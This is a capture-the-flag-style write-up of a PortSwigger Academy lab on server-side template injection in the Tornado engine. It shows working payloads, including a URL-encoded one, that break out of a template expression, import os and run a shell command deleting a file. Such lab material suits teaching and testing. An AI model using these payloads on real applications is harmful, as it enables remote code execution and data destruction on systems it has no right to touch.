# Basic Server-Side Template Injection (Code Context)

>
 **PortSwigger Web Security Academy — Practitioner Lab**

> **Vulnerability:** Server-Side Template Injection (SSTI)

> **Template Engine:** Tornado

> **Status:** Solved ✅



## Lab Objective



The application is vulnerable to **Server-Side Template Injection (SSTI)** because it unsafely uses a Tornado 
template.



The goal is to exploit the SSTI vulnerability to execute Python code on the server and delete:



```text

/home/carlos/morale.txt

```


**Credentials:**



```text

Username: wiener

Password: peter

```



---



## 1. Identify the Injection Point



1. Log in with the provided credentials.

2. Post a comment on one of the blog posts.

3. Go to **My account**.

4. Change the **blog post author display** option.



The application sends:



```http

POST /my-account/change-blog-post-author-display

```



The important parameter is:



```text

blog-post-author-display

```



Normally, its value is something like:



```text

user.name


```



Send this request to **Burp Repeater**.



---



## 2. Test for SSTI



Tornado templates use double curly braces for expressions:



```text

{{ expression }}

```



Test whether the server evaluates our input:



```text

user.name}}{{7*7}}

```



The important part is:



```text

{{7*7}}

```



After reloading the page containing the comment, the displayed name becomes similar to:



```text

Peter Wiener49}}

```



The value:



```text

49

```



confirms that:




```text

7 * 7 = 49

```



was evaluated by the server.



### Conclusion




The application is vulnerable to **SSTI**.



---



## 3. Understand the Template Context



The original template expression is effectively:



```text

{{user.name}}

```



Our payload:



```text

user.name}}{{7*7}}

```



breaks out of the original expression:



```text

{{user.name}}

```



and injects a new expression:



```text

{{7*7}}

```



This confirms that our input is being interpreted as **Tornado template syntax**.



---



## 4. Find Python Code Execution



Tornado templates support Python statements using:




```text

{% ... %}

```



For example:



```text

{% import os %}

```



The `os` module can then be used to execute operating-system commands through:




```python

os.system()

```



Python documentation:


[Python `os.system()` documentation](https://docs.python.org/3/library/os.html?utm_source=chatgpt.com#os.system)

Tornado template documentation:


[Tornado Template Documentation](https://www.tornadoweb.org/en/stable/template.html?utm_source=chatgpt.com)


---



## 5. Build the Exploit



We need to:



1. Break out of the original expression.

2. Import Python's `os` module.

3. Execute the required system command.



The payload before URL encoding is:



```text

user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')

```



The important components are:



```text

user.name}}


```



Break out of the original expression.



```text

{% import os %}

```


Import the `os` module.



```text

{{os.system('rm /home/carlos/morale.txt')

```



Execute the system command.



---



## 6. URL-Encoded Payload



Insert the following into the `blog-post-author-display` parameter:



```text

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')

```




The URL encoding is important because characters such as `%` and spaces must be encoded when included in the HTTP 
parameter.



---



## 7. Execute the Payload



In **Burp Repeater**:



1. Return to:


```http

POST /my-account/change-blog-post-author-display

```



2. Replace the value of:


```text

blog-post-author-display

```



with the malicious payload.



3. Send the request.

4. Reload the page containing the test comment.



The Tornado template processes the injected code and executes:



```bash

rm /home/carlos/morale.txt

```



The file is deleted and the lab is solved.



---



# Exploitation Flow



```text

User-controlled parameter

        ↓

Tornado Template

        ↓

{{7*7}}

        ↓

49

        ↓

SSTI confirmed

        ↓

{% import os %}

        ↓

Python code execution

        ↓

os.system(...)

        ↓

OS command execution

        ↓

Delete morale.txt

```



---


# Key Takeaways



### SSTI Detection



A simple mathematical expression is a good initial test:




```text

{{7*7}}

```



If the response contains:



```text

49

```



the input is likely being evaluated by a server-side template engine.



### Expression vs. Code Context



**Expression:**



```text

{{7*7}}

```



Used to evaluate an expression.


**Code:**



```text

{% import os %}

```



Used to execute template/Python statements.



### Important Payload Progression



```text

{{7*7}}

```



↓



```text

user.name}}{{7*7}}

```




↓



```text

{% import os %}

```



↓


```text

{{os.system('command')}}

```




This progression is useful when testing SSTI vulnerabilities in a controlled lab environment.



---



## References


* [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)

* [Tornado — Templates Documentation](https://www.tornadoweb.org/en/stable/template.html?utm_source=chatgpt.com)

* [Python — `os` module documentation](https://docs.python.org/3/library/os.html?utm_source=chatgpt.com)

